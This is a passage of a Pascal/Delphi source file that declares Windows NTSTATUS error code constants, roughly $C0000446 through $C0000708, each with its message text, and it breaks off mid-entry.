// MessageId: STATUS_INVALID_LABEL
//
// MessageText:
//
// Indicates a particular Security ID may not be assigned as the label of an object.
//
STATUS_INVALID_LABEL             = NTSTATUS($C0000446);

//
// MessageId: STATUS_DRIVER_PROCESS_TERMINATED
//
// MessageText:
//
// The process hosting the driver for this device has terminated.
//
STATUS_DRIVER_PROCESS_TERMINATED = NTSTATUS($C0000450);

//
// MessageId: STATUS_AMBIGUOUS_SYSTEM_DEVICE
//
// MessageText:
//
// The requested system device cannot be identified due to multiple indistinguishable devices potentially matching the identification criteria.
//
STATUS_AMBIGUOUS_SYSTEM_DEVICE   = NTSTATUS($C0000451);

//
// MessageId: STATUS_SYSTEM_DEVICE_NOT_FOUND
//
// MessageText:
//
// The requested system device cannot be found.
//
STATUS_SYSTEM_DEVICE_NOT_FOUND   = NTSTATUS($C0000452);

//
// MessageId: STATUS_RESTART_BOOT_APPLICATION
//
// MessageText:
//
// This boot application must be restarted.
//
STATUS_RESTART_BOOT_APPLICATION  = NTSTATUS($C0000453);

//
// MessageId: STATUS_INSUFFICIENT_NVRAM_RESOURCES
//
// MessageText:
//
// Insufficient NVRAM resources exist to complete the API.  A reboot might be required.
//
STATUS_INSUFFICIENT_NVRAM_RESOURCES = NTSTATUS($C0000454);

//
// MessageId: STATUS_INVALID_SESSION
//
// MessageText:
//
// The specified session is invalid.
//
STATUS_INVALID_SESSION           = NTSTATUS($C0000455);

//
// MessageId: STATUS_THREAD_ALREADY_IN_SESSION
//
// MessageText:
//
// The specified thread is already in a session.
//
STATUS_THREAD_ALREADY_IN_SESSION = NTSTATUS($C0000456);

//
// MessageId: STATUS_THREAD_NOT_IN_SESSION
//
// MessageText:
//
// The specified thread is not in a session.
//
STATUS_THREAD_NOT_IN_SESSION     = NTSTATUS($C0000457);

//
// MessageId: STATUS_INVALID_WEIGHT
//
// MessageText:
//
// The specified weight is invalid.
//
STATUS_INVALID_WEIGHT            = NTSTATUS($C0000458);

//
// MessageId: STATUS_REQUEST_PAUSED
//
// MessageText:
//
// The operation was paused.
//
STATUS_REQUEST_PAUSED            = NTSTATUS($C0000459);

//
// MessageId: STATUS_NO_RANGES_PROCESSED
//
// MessageText:
//
// No ranges for the specified operation were able to be processed.
//
STATUS_NO_RANGES_PROCESSED       = NTSTATUS($C0000460);

//
// MessageId: STATUS_DISK_RESOURCES_EXHAUSTED
//
// MessageText:
//
// The physical resources of this disk have been exhausted.
//
STATUS_DISK_RESOURCES_EXHAUSTED  = NTSTATUS($C0000461);

//
// MessageId: STATUS_NEEDS_REMEDIATION
//
// MessageText:
//
// The application cannot be started. Try reinstalling the application to fix the problem.
//
STATUS_NEEDS_REMEDIATION         = NTSTATUS($C0000462);

//
// MessageId: STATUS_DEVICE_FEATURE_NOT_SUPPORTED
//
// MessageText:
//
// {Device Feature Not Supported}
// The device does not support the command feature.
//
STATUS_DEVICE_FEATURE_NOT_SUPPORTED = NTSTATUS($C0000463);

//
// MessageId: STATUS_DEVICE_UNREACHABLE
//
// MessageText:
//
// {Source/Destination device unreachable}
// The device is unreachable.
//
STATUS_DEVICE_UNREACHABLE        = NTSTATUS($C0000464);

//
// MessageId: STATUS_INVALID_TOKEN
//
// MessageText:
//
// {Invalid Proxy Data Token}
// The token representing the data is invalid.
//
STATUS_INVALID_TOKEN             = NTSTATUS($C0000465);

//
// MessageId: STATUS_SERVER_UNAVAILABLE
//
// MessageText:
//
// The file server is temporarily unavailable.
//
STATUS_SERVER_UNAVAILABLE        = NTSTATUS($C0000466);

//
// MessageId: STATUS_FILE_NOT_AVAILABLE
//
// MessageText:
//
// The file is temporarily unavailable.
//
STATUS_FILE_NOT_AVAILABLE        = NTSTATUS($C0000467);

//
// MessageId: STATUS_DEVICE_INSUFFICIENT_RESOURCES
//
// MessageText:
//
// {Device Insufficient Resources}
// The target device has insufficient resources to complete the operation.
//
STATUS_DEVICE_INSUFFICIENT_RESOURCES = NTSTATUS($C0000468);

//
// MessageId: STATUS_PACKAGE_UPDATING
//
// MessageText:
//
// The application cannot be started because it is currently updating.
//
STATUS_PACKAGE_UPDATING          = NTSTATUS($C0000469);

//
// MessageId: STATUS_NOT_READ_FROM_COPY
//
// MessageText:
//
// The specified copy of the requested data could not be read.
//
STATUS_NOT_READ_FROM_COPY        = NTSTATUS($C000046A);

//
// MessageId: STATUS_FT_WRITE_FAILURE
//
// MessageText:
//
// The specified data could not be written to any of the copies.
//
STATUS_FT_WRITE_FAILURE          = NTSTATUS($C000046B);

//
// MessageId: STATUS_FT_DI_SCAN_REQUIRED
//
// MessageText:
//
// One or more copies of data on this device may be out of sync. No writes may be performed until a data integrity scan is completed.
//
STATUS_FT_DI_SCAN_REQUIRED       = NTSTATUS($C000046C);

//
// MessageId: STATUS_OBJECT_NOT_EXTERNALLY_BACKED
//
// MessageText:
//
// This object is not externally backed by any provider.
//
STATUS_OBJECT_NOT_EXTERNALLY_BACKED = NTSTATUS($C000046D);

//
// MessageId: STATUS_EXTERNAL_BACKING_PROVIDER_UNKNOWN
//
// MessageText:
//
// The external backing provider is not recognized.
//
STATUS_EXTERNAL_BACKING_PROVIDER_UNKNOWN = NTSTATUS($C000046E);

//
// MessageId: STATUS_COMPRESSION_NOT_BENEFICIAL
//
// MessageText:
//
// Compressing this object would not save space.
//
STATUS_COMPRESSION_NOT_BENEFICIAL = NTSTATUS($C000046F);

//
// MessageId: STATUS_DATA_CHECKSUM_ERROR
//
// MessageText:
//
// A data integrity checksum error occurred. Data in the file stream is corrupt.
//
STATUS_DATA_CHECKSUM_ERROR       = NTSTATUS($C0000470);

//
// MessageId: STATUS_INTERMIXED_KERNEL_EA_OPERATION
//
// MessageText:
//
// An attempt was made to modify both a KERNEL and normal Extended Attribute (EA) in the same operation.
//
STATUS_INTERMIXED_KERNEL_EA_OPERATION = NTSTATUS($C0000471);

//
// MessageId: STATUS_TRIM_READ_ZERO_NOT_SUPPORTED
//
// MessageText:
//
// {LogicalBlockProvisioningReadZero Not Supported}
// The target device does not support read returning zeros from trimmed/unmapped blocks.
//
STATUS_TRIM_READ_ZERO_NOT_SUPPORTED = NTSTATUS($C0000472);

//
// MessageId: STATUS_TOO_MANY_SEGMENT_DESCRIPTORS
//
// MessageText:
//
// {Maximum Segment Descriptors Exceeded}
// The command specified a number of descriptors that exceeded the maximum supported by the device.
//
STATUS_TOO_MANY_SEGMENT_DESCRIPTORS = NTSTATUS($C0000473);

//
// MessageId: STATUS_INVALID_OFFSET_ALIGNMENT
//
// MessageText:
//
// {Alignment Violation}
// The command specified a data offset that does not align to the device's granularity/alignment.
//
STATUS_INVALID_OFFSET_ALIGNMENT  = NTSTATUS($C0000474);

//
// MessageId: STATUS_INVALID_FIELD_IN_PARAMETER_LIST
//
// MessageText:
//
// {Invalid Field In Parameter List}
// The command specified an invalid field in its parameter list.
//
STATUS_INVALID_FIELD_IN_PARAMETER_LIST = NTSTATUS($C0000475);

//
// MessageId: STATUS_OPERATION_IN_PROGRESS
//
// MessageText:
//
// {Operation In Progress}
// An operation is currently in progress with the device.
//
STATUS_OPERATION_IN_PROGRESS     = NTSTATUS($C0000476);

//
// MessageId: STATUS_INVALID_INITIATOR_TARGET_PATH
//
// MessageText:
//
// {Invalid I_T Nexus}
// An attempt was made to send down the command via an invalid path to the target device.
//
STATUS_INVALID_INITIATOR_TARGET_PATH = NTSTATUS($C0000477);

//
// MessageId: STATUS_SCRUB_DATA_DISABLED
//
// MessageText:
//
// Scrub is disabled on the specified file.
//
STATUS_SCRUB_DATA_DISABLED       = NTSTATUS($C0000478);

//
// MessageId: STATUS_NOT_REDUNDANT_STORAGE
//
// MessageText:
//
// The storage device does not provide redundancy.
//
STATUS_NOT_REDUNDANT_STORAGE     = NTSTATUS($C0000479);

//
// MessageId: STATUS_RESIDENT_FILE_NOT_SUPPORTED
//
// MessageText:
//
// An operation is not supported on a resident file.
//
STATUS_RESIDENT_FILE_NOT_SUPPORTED = NTSTATUS($C000047A);

//
// MessageId: STATUS_COMPRESSED_FILE_NOT_SUPPORTED
//
// MessageText:
//
// An operation is not supported on a compressed file.
//
STATUS_COMPRESSED_FILE_NOT_SUPPORTED = NTSTATUS($C000047B);

//
// MessageId: STATUS_DIRECTORY_NOT_SUPPORTED
//
// MessageText:
//
// An operation is not supported on a directory.
//
STATUS_DIRECTORY_NOT_SUPPORTED   = NTSTATUS($C000047C);

//
// MessageId: STATUS_IO_OPERATION_TIMEOUT
//
// MessageText:
//
// {IO Operation Timeout}
// The specified I/O operation failed to complete within the expected time period.
//
STATUS_IO_OPERATION_TIMEOUT      = NTSTATUS($C000047D);

//
// MessageId: STATUS_SYSTEM_NEEDS_REMEDIATION
//
// MessageText:
//
// An error in a system binary was detected. Try refreshing the PC to fix the problem.
//
STATUS_SYSTEM_NEEDS_REMEDIATION  = NTSTATUS($C000047E);

//
// MessageId: STATUS_APPX_INTEGRITY_FAILURE_CLR_NGEN
//
// MessageText:
//
// A corrupted CLR NGEN binary was detected on the system.
//
STATUS_APPX_INTEGRITY_FAILURE_CLR_NGEN = NTSTATUS($C000047F);

//
// MessageId: STATUS_SHARE_UNAVAILABLE
//
// MessageText:
//
// The share is temporarily unavailable.
//
STATUS_SHARE_UNAVAILABLE         = NTSTATUS($C0000480);

//
// MessageId: STATUS_APISET_NOT_HOSTED
//
// MessageText:
//
// The target dll was not found because the apiset %hs is not hosted.
//
STATUS_APISET_NOT_HOSTED         = NTSTATUS($C0000481);

//
// MessageId: STATUS_APISET_NOT_PRESENT
//
// MessageText:
//
// The API set extension contains a host for a non-existent API set.
//
STATUS_APISET_NOT_PRESENT        = NTSTATUS($C0000482);

//
// MessageId: STATUS_DEVICE_HARDWARE_ERROR
//
// MessageText:
//
// The request failed due to a fatal device hardware error.
//
STATUS_DEVICE_HARDWARE_ERROR     = NTSTATUS($C0000483);

//
// MessageId: STATUS_FIRMWARE_SLOT_INVALID
//
// MessageText:
//
// The specified firmware slot is invalid.
//
STATUS_FIRMWARE_SLOT_INVALID     = NTSTATUS($C0000484);

//
// MessageId: STATUS_FIRMWARE_IMAGE_INVALID
//
// MessageText:
//
// The specified firmware image is invalid.
//
STATUS_FIRMWARE_IMAGE_INVALID    = NTSTATUS($C0000485);

//
// MessageId: STATUS_STORAGE_TOPOLOGY_ID_MISMATCH
//
// MessageText:
//
// The request failed due to a storage topology ID mismatch.
//
STATUS_STORAGE_TOPOLOGY_ID_MISMATCH = NTSTATUS($C0000486);

//
// MessageId: STATUS_WIM_NOT_BOOTABLE
//
// MessageText:
//
// The specified Windows Image (WIM) is not marked as bootable.
//
STATUS_WIM_NOT_BOOTABLE          = NTSTATUS($C0000487);

//
// MessageId: STATUS_BLOCKED_BY_PARENTAL_CONTROLS
//
// MessageText:
//
// The operation was blocked by parental controls.
//
STATUS_BLOCKED_BY_PARENTAL_CONTROLS = NTSTATUS($C0000488);

//
// MessageId: STATUS_NEEDS_REGISTRATION
//
// MessageText:
//
// The deployment operation failed because the specified application needs to be registered first.
//
STATUS_NEEDS_REGISTRATION        = NTSTATUS($C0000489);

//
// MessageId: STATUS_QUOTA_ACTIVITY
//
// MessageText:
//
// The requested operation failed due to quota operation is still in progress.
//
STATUS_QUOTA_ACTIVITY            = NTSTATUS($C000048A);

//
// MessageId: STATUS_CALLBACK_INVOKE_INLINE
//
// MessageText:
//
// The callback function must be invoked inline.
//
STATUS_CALLBACK_INVOKE_INLINE    = NTSTATUS($C000048B);

//
// MessageId: STATUS_BLOCK_TOO_MANY_REFERENCES
//
// MessageText:
//
// A file system block being referenced has already reached the maximum reference count and can't be referenced any further.
//
STATUS_BLOCK_TOO_MANY_REFERENCES = NTSTATUS($C000048C);

//
// MessageId: STATUS_MARKED_TO_DISALLOW_WRITES
//
// MessageText:
//
// The requested operation failed because the file stream is marked to disallow writes.
//
STATUS_MARKED_TO_DISALLOW_WRITES = NTSTATUS($C000048D);

//
// MessageId: STATUS_NETWORK_ACCESS_DENIED_EDP
//
// MessageText:
//
// Windows Information Protection policy does not allow access to this network resource.
//
STATUS_NETWORK_ACCESS_DENIED_EDP = NTSTATUS($C000048E);

//
// MessageId: STATUS_ENCLAVE_FAILURE
//
// MessageText:
//
// The requested operation failed with an architecture-specific failure code.
//
STATUS_ENCLAVE_FAILURE           = NTSTATUS($C000048F);

//
// MessageId: STATUS_PNP_NO_COMPAT_DRIVERS
//
// MessageText:
//
// There are no compatible drivers available for this device.
//
STATUS_PNP_NO_COMPAT_DRIVERS     = NTSTATUS($C0000490);

//
// MessageId: STATUS_PNP_DRIVER_PACKAGE_NOT_FOUND
//
// MessageText:
//
// The specified driver package cannot be found on the system.
//
STATUS_PNP_DRIVER_PACKAGE_NOT_FOUND = NTSTATUS($C0000491);

//
// MessageId: STATUS_PNP_DRIVER_CONFIGURATION_NOT_FOUND
//
// MessageText:
//
// The driver package cannot find a required driver configuration.
//
STATUS_PNP_DRIVER_CONFIGURATION_NOT_FOUND = NTSTATUS($C0000492);

//
// MessageId: STATUS_PNP_DRIVER_CONFIGURATION_INCOMPLETE
//
// MessageText:
//
// The driver configuration is incomplete for use with this device.
//
STATUS_PNP_DRIVER_CONFIGURATION_INCOMPLETE = NTSTATUS($C0000493);

//
// MessageId: STATUS_PNP_FUNCTION_DRIVER_REQUIRED
//
// MessageText:
//
// The device requires a driver configuration with a function driver.
//
STATUS_PNP_FUNCTION_DRIVER_REQUIRED = NTSTATUS($C0000494);

//
// MessageId: STATUS_PNP_DEVICE_CONFIGURATION_PENDING
//
// MessageText:
//
// The device is pending further configuration.
//
STATUS_PNP_DEVICE_CONFIGURATION_PENDING = NTSTATUS($C0000495);

//
// MessageId: STATUS_DEVICE_HINT_NAME_BUFFER_TOO_SMALL
//
// MessageText:
//
// The device hint name buffer is too small to receive the remaining name.
//
STATUS_DEVICE_HINT_NAME_BUFFER_TOO_SMALL = NTSTATUS($C0000496);

//
// MessageId: STATUS_PACKAGE_NOT_AVAILABLE
//
// MessageText:
//
// The package is currently not available.
//
STATUS_PACKAGE_NOT_AVAILABLE     = NTSTATUS($C0000497);

//
// MessageId: STATUS_DEVICE_IN_MAINTENANCE
//
// MessageText:
//
// The device is in maintenance mode.
//
STATUS_DEVICE_IN_MAINTENANCE     = NTSTATUS($C0000499);

//
// MessageId: STATUS_NOT_SUPPORTED_ON_DAX
//
// MessageText:
//
// This operation is not supported on a DAX volume.
//
STATUS_NOT_SUPPORTED_ON_DAX      = NTSTATUS($C000049A);

//
// MessageId: STATUS_FREE_SPACE_TOO_FRAGMENTED
//
// MessageText:
//
// The free space on the volume is too fragmented to complete this operation.
//
STATUS_FREE_SPACE_TOO_FRAGMENTED = NTSTATUS($C000049B);

//
// MessageId: STATUS_DAX_MAPPING_EXISTS
//
// MessageText:
//
// The volume has active DAX mappings.
//
STATUS_DAX_MAPPING_EXISTS        = NTSTATUS($C000049C);

//
// MessageId: STATUS_CHILD_PROCESS_BLOCKED
//
// MessageText:
//
// The process creation has been blocked.
//
STATUS_CHILD_PROCESS_BLOCKED     = NTSTATUS($C000049D);

//
// MessageId: STATUS_STORAGE_LOST_DATA_PERSISTENCE
//
// MessageText:
//
// The storage device has lost data or persistence.
//
STATUS_STORAGE_LOST_DATA_PERSISTENCE = NTSTATUS($C000049E);

//
// MessageId: STATUS_VRF_CFG_AND_IO_ENABLED
//
// MessageText:
//
// Driver Verifier Volatile settings cannot be set when CFG and IO are enabled.
//
STATUS_VRF_CFG_AND_IO_ENABLED    = NTSTATUS($C000049F);

//
// MessageId: STATUS_PARTITION_TERMINATING
//
// MessageText:
//
// An attempt was made to access a partition that has begun termination.
//
STATUS_PARTITION_TERMINATING     = NTSTATUS($C00004A0);

//
// MessageId: STATUS_EXTERNAL_SYSKEY_NOT_SUPPORTED
//
// MessageText:
//
// An externally encrypted syskey has been configured, but the system no longer supports this feature.  Please see https://go.microsoft.com/fwlink/?linkid=851152 for more information.
//
STATUS_EXTERNAL_SYSKEY_NOT_SUPPORTED = NTSTATUS($C00004A1);

//
// MessageId: STATUS_ENCLAVE_VIOLATION
//
// MessageText:
//
// An attempt was made to access protected memory in violation of its secure access policy.
//
STATUS_ENCLAVE_VIOLATION         = NTSTATUS($C00004A2);    // winnt

//
// MessageId: STATUS_FILE_PROTECTED_UNDER_DPL
//
// MessageText:
//
// The read or write operation to an encrypted file could not be completed because the file can only be accessed when the device is unlocked.
//
STATUS_FILE_PROTECTED_UNDER_DPL  = NTSTATUS($C00004A3);

//
// MessageId: STATUS_VOLUME_NOT_CLUSTER_ALIGNED
//
// MessageText:
//
// The volume is not cluster aligned on the disk.
//
STATUS_VOLUME_NOT_CLUSTER_ALIGNED = NTSTATUS($C00004A4);

//
// MessageId: STATUS_NO_PHYSICALLY_ALIGNED_FREE_SPACE_FOUND
//
// MessageText:
//
// No physically aligned free space was found on the volume.
//
STATUS_NO_PHYSICALLY_ALIGNED_FREE_SPACE_FOUND = NTSTATUS($C00004A5);

//
// MessageId: STATUS_APPX_FILE_NOT_ENCRYPTED
//
// MessageText:
//
// The APPX file can not be accessed because it is not encrypted as expected.
//
STATUS_APPX_FILE_NOT_ENCRYPTED   = NTSTATUS($C00004A6);

//
// MessageId: STATUS_RWRAW_ENCRYPTED_FILE_NOT_ENCRYPTED
//
// MessageText:
//
// A read or write of raw encrypted data cannot be performed because the file is not encrypted.
//
STATUS_RWRAW_ENCRYPTED_FILE_NOT_ENCRYPTED = NTSTATUS($C00004A7);

//
// MessageId: STATUS_RWRAW_ENCRYPTED_INVALID_EDATAINFO_FILEOFFSET
//
// MessageText:
//
// An invalid file offset in the encrypted data info block was passed for read or write operation of file's raw encrypted data.
//
STATUS_RWRAW_ENCRYPTED_INVALID_EDATAINFO_FILEOFFSET = NTSTATUS($C00004A8);

//
// MessageId: STATUS_RWRAW_ENCRYPTED_INVALID_EDATAINFO_FILERANGE
//
// MessageText:
//
// An invalid offset and length combination in the encrypted data info was passed for read or write operation of file's raw encrypted data.
//
STATUS_RWRAW_ENCRYPTED_INVALID_EDATAINFO_FILERANGE = NTSTATUS($C00004A9);

//
// MessageId: STATUS_RWRAW_ENCRYPTED_INVALID_EDATAINFO_PARAMETER
//
// MessageText:
//
// An invalid parameter in the encrypted data info was passed for read or write operation of file's raw encrypted data.
//
STATUS_RWRAW_ENCRYPTED_INVALID_EDATAINFO_PARAMETER = NTSTATUS($C00004AA);

//
// MessageId: STATUS_FT_READ_FAILURE
//
// MessageText:
//
// The specified data could not be read from any of the copies.
//
STATUS_FT_READ_FAILURE           = NTSTATUS($C00004AB);

//
// MessageId: STATUS_PATCH_CONFLICT
//
// MessageText:
//
// A system patch could not be applied due to conflicting accesses to the system image.
//
STATUS_PATCH_CONFLICT            = NTSTATUS($C00004AC);

//
// MessageId: STATUS_STORAGE_RESERVE_ID_INVALID
//
// MessageText:
//
// The specified storage reserve ID is invalid.
//
STATUS_STORAGE_RESERVE_ID_INVALID = NTSTATUS($C00004AD);

//
// MessageId: STATUS_STORAGE_RESERVE_DOES_NOT_EXIST
//
// MessageText:
//
// The specified storage reserve does not exist.
//
STATUS_STORAGE_RESERVE_DOES_NOT_EXIST = NTSTATUS($C00004AE);

//
// MessageId: STATUS_STORAGE_RESERVE_ALREADY_EXISTS
//
// MessageText:
//
// The specified storage reserve already exists.
//
STATUS_STORAGE_RESERVE_ALREADY_EXISTS = NTSTATUS($C00004AF);

//
// MessageId: STATUS_STORAGE_RESERVE_NOT_EMPTY
//
// MessageText:
//
// The specified storage reserve is not empty.
//
STATUS_STORAGE_RESERVE_NOT_EMPTY = NTSTATUS($C00004B0);

//
// MessageId: STATUS_NOT_A_DAX_VOLUME
//
// MessageText:
//
// This operation requires a DAX volume.
//
STATUS_NOT_A_DAX_VOLUME          = NTSTATUS($C00004B1);

//
// MessageId: STATUS_NOT_DAX_MAPPABLE
//
// MessageText:
//
// This stream is not DAX mappable.
//
STATUS_NOT_DAX_MAPPABLE          = NTSTATUS($C00004B2);

//
// MessageId: STATUS_CASE_DIFFERING_NAMES_IN_DIR
//
// MessageText:
//
// This directory contains entries whose names differ only in case.
//
STATUS_CASE_DIFFERING_NAMES_IN_DIR = NTSTATUS($C00004B3);

//
// MessageId: STATUS_FILE_NOT_SUPPORTED
//
// MessageText:
//
// The file cannot be safely opened because it is not supported by this version of Windows.
//
STATUS_FILE_NOT_SUPPORTED        = NTSTATUS($C00004B4);

//
// MessageId: STATUS_NOT_SUPPORTED_WITH_BTT
//
// MessageText:
//
// This operation is not supported with BTT enabled.
//
STATUS_NOT_SUPPORTED_WITH_BTT    = NTSTATUS($C00004B5);

//
// MessageId: STATUS_ENCRYPTION_DISABLED
//
// MessageText:
//
// This operation cannot be performed because encryption is currently disabled.
//
STATUS_ENCRYPTION_DISABLED       = NTSTATUS($C00004B6);

//
// MessageId: STATUS_ENCRYPTING_METADATA_DISALLOWED
//
// MessageText:
//
// This encryption operation cannot be performed on filesystem metadata.
//
STATUS_ENCRYPTING_METADATA_DISALLOWED = NTSTATUS($C00004B7);

//
// MessageId: STATUS_CANT_CLEAR_ENCRYPTION_FLAG
//
// MessageText:
//
// Encryption cannot be cleared on this file/directory because it still has an encrypted attribute.
//
STATUS_CANT_CLEAR_ENCRYPTION_FLAG = NTSTATUS($C00004B8);

//
// MessageId: STATUS_UNSATISFIED_DEPENDENCIES
//
// MessageText:
//
// The operation could not be completed due to one or more unsatisfied dependencies.
//
STATUS_UNSATISFIED_DEPENDENCIES  = NTSTATUS($C00004B9);

//
// MessageId: STATUS_CASE_SENSITIVE_PATH
//
// MessageText:
//
// The file cannot be opened because the path has a case-sensitive directory.
//
STATUS_CASE_SENSITIVE_PATH       = NTSTATUS($C00004BA);

//
// MessageId: STATUS_HAS_SYSTEM_CRITICAL_FILES
//
// MessageText:
//
// The volume contains paging, crash dump or other system critical files.
//
STATUS_HAS_SYSTEM_CRITICAL_FILES = NTSTATUS($C00004BD);


//     **** New SYSTEM error codes can be inserted here ****

//
// MessageId: STATUS_INVALID_TASK_NAME
//
// MessageText:
//
// The specified task name is invalid.
//
STATUS_INVALID_TASK_NAME         = NTSTATUS($C0000500);

//
// MessageId: STATUS_INVALID_TASK_INDEX
//
// MessageText:
//
// The specified task index is invalid.
//
STATUS_INVALID_TASK_INDEX        = NTSTATUS($C0000501);

//
// MessageId: STATUS_THREAD_ALREADY_IN_TASK
//
// MessageText:
//
// The specified thread is already joining a task.
//
STATUS_THREAD_ALREADY_IN_TASK    = NTSTATUS($C0000502);

//
// MessageId: STATUS_CALLBACK_BYPASS
//
// MessageText:
//
// A callback has requested to bypass native code.
//
STATUS_CALLBACK_BYPASS           = NTSTATUS($C0000503);

//
// MessageId: STATUS_UNDEFINED_SCOPE
//
// MessageText:
//
// The Central Access Policy specified is not defined on the target machine.
//
STATUS_UNDEFINED_SCOPE           = NTSTATUS($C0000504);

//
// MessageId: STATUS_INVALID_CAP
//
// MessageText:
//
// The Central Access Policy obtained from Active Directory is invalid.
//
STATUS_INVALID_CAP               = NTSTATUS($C0000505);

//
// MessageId: STATUS_NOT_GUI_PROCESS
//
// MessageText:
//
// Unable to finish the requested operation because the specified process is not a GUI process.
//
STATUS_NOT_GUI_PROCESS           = NTSTATUS($C0000506);

//
// MessageId: STATUS_DEVICE_HUNG
//
// MessageText:
//
// The device is not responding and cannot be safely removed.
//
STATUS_DEVICE_HUNG               = NTSTATUS($C0000507);

//
// MessageId: STATUS_CONTAINER_ASSIGNED
//
// MessageText:
//
// The specified Job already has a container assigned to it.
//
STATUS_CONTAINER_ASSIGNED        = NTSTATUS($C0000508);

//
// MessageId: STATUS_JOB_NO_CONTAINER
//
// MessageText:
//
// The specified Job does not have a container assigned to it.
//
STATUS_JOB_NO_CONTAINER          = NTSTATUS($C0000509);

//
// MessageId: STATUS_DEVICE_UNRESPONSIVE
//
// MessageText:
//
// The device is unresponsive.
//
STATUS_DEVICE_UNRESPONSIVE       = NTSTATUS($C000050A);

//
// MessageId: STATUS_REPARSE_POINT_ENCOUNTERED
//
// MessageText:
//
// The object manager encountered a reparse point while retrieving an object.
//
STATUS_REPARSE_POINT_ENCOUNTERED = NTSTATUS($C000050B);

//
// MessageId: STATUS_ATTRIBUTE_NOT_PRESENT
//
// MessageText:
//
// The requested attribute is not present on the specified file or directory.
//
STATUS_ATTRIBUTE_NOT_PRESENT     = NTSTATUS($C000050C);

//
// MessageId: STATUS_NOT_A_TIERED_VOLUME
//
// MessageText:
//
// This volume is not a tiered volume.
//
STATUS_NOT_A_TIERED_VOLUME       = NTSTATUS($C000050D);

//
// MessageId: STATUS_ALREADY_HAS_STREAM_ID
//
// MessageText:
//
// This file is currently associated with a different stream id.
//
STATUS_ALREADY_HAS_STREAM_ID     = NTSTATUS($C000050E);

//
// MessageId: STATUS_JOB_NOT_EMPTY
//
// MessageText:
//
// The requested operation could not be completed because the specified job has children.
//
STATUS_JOB_NOT_EMPTY             = NTSTATUS($C000050F);

//
// MessageId: STATUS_ALREADY_INITIALIZED
//
// MessageText:
//
// The specified object has already been initialized.
//
STATUS_ALREADY_INITIALIZED       = NTSTATUS($C0000510);

//
// MessageId: STATUS_ENCLAVE_NOT_TERMINATED
//
// MessageText:
//
// The specified enclave has not yet been terminated.
//
STATUS_ENCLAVE_NOT_TERMINATED    = NTSTATUS($C0000511);

//
// MessageId: STATUS_ENCLAVE_IS_TERMINATING
//
// MessageText:
//
// An attempt was made to access an enclave that has begun termination.
//
STATUS_ENCLAVE_IS_TERMINATING    = NTSTATUS($C0000512);

//
// MessageId: STATUS_SMB1_NOT_AVAILABLE
//
// MessageText:
//
// You can't connect to the file share because it's not secure. This share requires the obsolete SMB1 protocol, which is unsafe and could expose your system to attack.
// Your system requires SMB2 or higher. For more info on resolving this issue, see: https://go.microsoft.com/fwlink/?linkid=852747
//
STATUS_SMB1_NOT_AVAILABLE        = NTSTATUS($C0000513);

//
// MessageId: STATUS_SMR_GARBAGE_COLLECTION_REQUIRED
//
// MessageText:
//
// The volume must undergo garbage collection.
//
STATUS_SMR_GARBAGE_COLLECTION_REQUIRED = NTSTATUS($C0000514);

//
// MessageId: STATUS_INTERRUPTED
//
// MessageText:
//
// Execution of the thread was interrupted.
//
STATUS_INTERRUPTED               = NTSTATUS($C0000515);    // winnt

//
// MessageId: STATUS_THREAD_NOT_RUNNING
//
// MessageText:
//
// The target thread is not currently running.
//
STATUS_THREAD_NOT_RUNNING        = NTSTATUS($C0000516);    // winnt


//     **** New SYSTEM error codes can be inserted here ****

//
// MessageId: STATUS_FAIL_FAST_EXCEPTION
//
// MessageText:
//
// {Fail Fast Exception}
// A fail fast exception occurred. Exception handlers will not be invoked and the process will be terminated immediately.
//
STATUS_FAIL_FAST_EXCEPTION       = NTSTATUS($C0000602);

//
// MessageId: STATUS_IMAGE_CERT_REVOKED
//
// MessageText:
//
// Windows cannot verify the digital signature for this file. The signing certificate for this file has been revoked.
//
STATUS_IMAGE_CERT_REVOKED        = NTSTATUS($C0000603);

//
// MessageId: STATUS_DYNAMIC_CODE_BLOCKED
//
// MessageText:
//
// The operation was blocked as the process prohibits dynamic code generation.
//
STATUS_DYNAMIC_CODE_BLOCKED      = NTSTATUS($C0000604);

//
// MessageId: STATUS_IMAGE_CERT_EXPIRED
//
// MessageText:
//
// Windows cannot verify the digital signature for this file. The signing certificate for this file has expired.
//
STATUS_IMAGE_CERT_EXPIRED        = NTSTATUS($C0000605);

//
// MessageId: STATUS_STRICT_CFG_VIOLATION
//
// MessageText:
//
// The specified image file was blocked from loading because it does not enable a feature required by the process: Control Flow Guard.
//
STATUS_STRICT_CFG_VIOLATION      = NTSTATUS($C0000606);

//
// MessageId: STATUS_SET_CONTEXT_DENIED
//
// MessageText:
//
// The thread context could not be updated because this has been restricted for the process.
//
STATUS_SET_CONTEXT_DENIED        = NTSTATUS($C000060A);

//
// MessageId: STATUS_CROSS_PARTITION_VIOLATION
//
// MessageText:
//
// An attempt to access another partition's private file/section was rejected.
//
STATUS_CROSS_PARTITION_VIOLATION = NTSTATUS($C000060B);

//
// MessageId: STATUS_PORT_CLOSED
//
// MessageText:
//
// The ALPC port is closed.
//
STATUS_PORT_CLOSED               = NTSTATUS($C0000700);

//
// MessageId: STATUS_MESSAGE_LOST
//
// MessageText:
//
// The ALPC message requested is no longer available.
//
STATUS_MESSAGE_LOST              = NTSTATUS($C0000701);

//
// MessageId: STATUS_INVALID_MESSAGE
//
// MessageText:
//
// The ALPC message supplied is invalid.
//
STATUS_INVALID_MESSAGE           = NTSTATUS($C0000702);

//
// MessageId: STATUS_REQUEST_CANCELED
//
// MessageText:
//
// The ALPC message has been canceled.
//
STATUS_REQUEST_CANCELED          = NTSTATUS($C0000703);

//
// MessageId: STATUS_RECURSIVE_DISPATCH
//
// MessageText:
//
// Invalid recursive dispatch attempt.
//
STATUS_RECURSIVE_DISPATCH        = NTSTATUS($C0000704);

//
// MessageId: STATUS_LPC_RECEIVE_BUFFER_EXPECTED
//
// MessageText:
//
// No receive buffer has been supplied in a synchronous request.
//
STATUS_LPC_RECEIVE_BUFFER_EXPECTED = NTSTATUS($C0000705);

//
// MessageId: STATUS_LPC_INVALID_CONNECTION_USAGE
//
// MessageText:
//
// The connection port is used in an invalid context.
//
STATUS_LPC_INVALID_CONNECTION_USAGE = NTSTATUS($C0000706);

//
// MessageId: STATUS_LPC_REQUESTS_NOT_ALLOWED
//
// MessageText:
//
// The ALPC port does not accept new request messages.
//
STATUS_LPC_REQUESTS_NOT_ALLOWED  = NTSTATUS($C0000707);

//
// MessageId: STATUS_RESOURCE_IN_USE
//
// MessageText:
//
// The resource requested is already in use.
//
STATUS_RESOURCE_IN_USE           = NTSTATUS($C0000708);

//
// MessageId: STATUS_HARDWARE_MEMORY_ERROR
//
// MessageText:
//
